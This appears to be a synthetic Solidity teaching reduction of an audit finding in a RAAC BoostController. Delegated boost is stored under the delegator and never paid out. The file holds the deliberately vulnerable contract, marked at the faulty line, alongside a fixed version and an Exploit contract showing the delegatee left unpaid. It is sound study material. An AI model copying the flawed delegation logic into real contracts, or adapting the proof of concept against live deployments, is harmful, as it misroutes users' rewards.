// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  RAAC BoostController — delegated boost is stored under the delegator and never paid
    (Codehawks, finding #57146).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: delegateBoost writes userBoosts[delegator][delegatee]. updateUserBoost reads
    userBoosts[user][pool] and _calculateBoost uses only that user's ve balance, so a delegatee
    with no ve of their own is left at MIN_BOOST (10000) and the reward pot goes to the other staker.
    Vulnerable line preserved verbatim below (@> VULN). */

contract Erc20 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Holder {}

contract BoostController {
    error InvalidPool();
    error InvalidBoostAmount();
    error InsufficientVeBalance();
    error BoostAlreadyDelegated();
    error PoolNotSupported();

    struct UserBoost {
        uint256 amount;
        uint256 expiry;
        address delegatedTo;
        uint256 lastUpdateTime;
    }

    Erc20 public immutable ve;
    Erc20 public immutable reward;
    mapping(address => mapping(address => UserBoost)) public userBoosts;
    mapping(address => bool) public supportedPools;
    uint256 public constant MIN_BOOST = 10000;

    constructor(Erc20 _ve, Erc20 _reward, address pool) {
        ve = _ve;
        reward = _reward;
        supportedPools[pool] = true;
    }

    function delegateBoost(address to, uint256 amount, uint256 duration) external {
        if (to == address(0)) revert InvalidPool();
        if (amount == 0) revert InvalidBoostAmount();
        if (duration == 0) revert InvalidBoostAmount();
        uint256 userBalance = ve.balanceOf(msg.sender);
        if (userBalance < amount) revert InsufficientVeBalance();
        // The slot below is userBoosts[msg.sender][to], not userBoosts[to][pool].
        UserBoost storage delegation = userBoosts[msg.sender][to];
        if (delegation.amount > 0) revert BoostAlreadyDelegated();
        delegation.amount = amount;
        delegation.expiry = block.timestamp + duration;
        delegation.delegatedTo = to; // @> VULN: this write lands in userBoosts[delegator][delegatee], not the delegatee's pool boost
    }

    function updateUserBoost(address user, address pool) public {
        if (!supportedPools[pool]) revert PoolNotSupported();
        UserBoost storage userBoost = userBoosts[user][pool];
        uint256 newBoost = _calculateBoost(user, 10000);
        userBoost.amount = newBoost;
        userBoost.lastUpdateTime = block.timestamp;
    }

    function _calculateBoost(address user, uint256 baseAmount) internal view returns (uint256) {
        uint256 veBal = ve.balanceOf(user);
        if (veBal == 0) return baseAmount;
        return veBal;
    }

    function settle(address pool, address delegatee, address other) external {
        updateUserBoost(delegatee, pool);
        updateUserBoost(other, pool);
        uint256 a = userBoosts[delegatee][pool].amount;
        uint256 b = userBoosts[other][pool].amount;
        uint256 pot = reward.balanceOf(address(this));
        uint256 payA = pot * a / (a + b);
        reward.transfer(delegatee, payA);
        reward.transfer(other, pot - payA);
    }
}

contract BoostControllerFixed {
    struct UserBoost {
        uint256 amount;
        uint256 expiry;
        address delegatedTo;
        uint256 lastUpdateTime;
    }

    Erc20 public immutable ve;
    Erc20 public immutable reward;
    mapping(address => mapping(address => UserBoost)) public userBoosts;
    mapping(address => uint256) public delegatedIn;
    mapping(address => bool) public supportedPools;

    constructor(Erc20 _ve, Erc20 _reward, address pool) {
        ve = _ve;
        reward = _reward;
        supportedPools[pool] = true;
    }

    function delegateBoost(address to, uint256 amount, uint256 duration) external {
        require(to != address(0) && amount > 0 && duration > 0, "bad");
        require(ve.balanceOf(msg.sender) >= amount, "ve");
        delegatedIn[to] += amount;
        UserBoost storage delegation = userBoosts[to][msg.sender];
        delegation.amount = amount;
        delegation.expiry = block.timestamp + duration;
        delegation.delegatedTo = to;
    }

    function updateUserBoost(address user, address pool) public {
        require(supportedPools[pool], "pool");
        uint256 veBal = ve.balanceOf(user) + delegatedIn[user];
        uint256 newBoost = veBal == 0 ? 10000 : veBal;
        userBoosts[user][pool].amount = newBoost;
        userBoosts[user][pool].lastUpdateTime = block.timestamp;
    }

    function settle(address pool, address delegatee, address other) external {
        updateUserBoost(delegatee, pool);
        updateUserBoost(other, pool);
        uint256 a = userBoosts[delegatee][pool].amount;
        uint256 b = userBoosts[other][pool].amount;
        uint256 pot = reward.balanceOf(address(this));
        uint256 payA = pot * a / (a + b);
        reward.transfer(delegatee, payA);
        reward.transfer(other, pot - payA);
    }
}

contract Exploit {
    address public constant POOL = address(uint160(0xBEEF));
    uint256 public constant VE_AMOUNT = 1_000_000 ether;
    uint256 public constant POT = 1000 ether;

    Erc20 public reward; // CREATE nonce 1
    Erc20 public ve; // CREATE nonce 2
    BoostController public boost; // CREATE nonce 3
    Holder public delegatee; // CREATE nonce 4
    Holder public other; // CREATE nonce 5

    constructor() {
        reward = new Erc20();
        ve = new Erc20();
        boost = new BoostController(ve, reward, POOL);
        delegatee = new Holder();
        other = new Holder();
    }

    function run() external {
        ve.mint(address(this), VE_AMOUNT);
        ve.mint(address(other), VE_AMOUNT);
        boost.delegateBoost(address(delegatee), VE_AMOUNT, 7 days);
        (uint256 stored, uint256 expiry, address to, uint256 updated) =
            boost.userBoosts(address(this), address(delegatee));
        require(expiry > block.timestamp && updated == 0, "delegation record");
        require(stored == VE_AMOUNT, "stored on delegator");
        require(to == address(delegatee), "to");
        reward.mint(address(boost), POT);
        boost.settle(POOL, address(delegatee), address(other));
        require(reward.balanceOf(address(delegatee)) < 1 ether, "delegatee unpaid");
        require(reward.balanceOf(address(other)) > 999 ether, "other took the pot");
    }
}
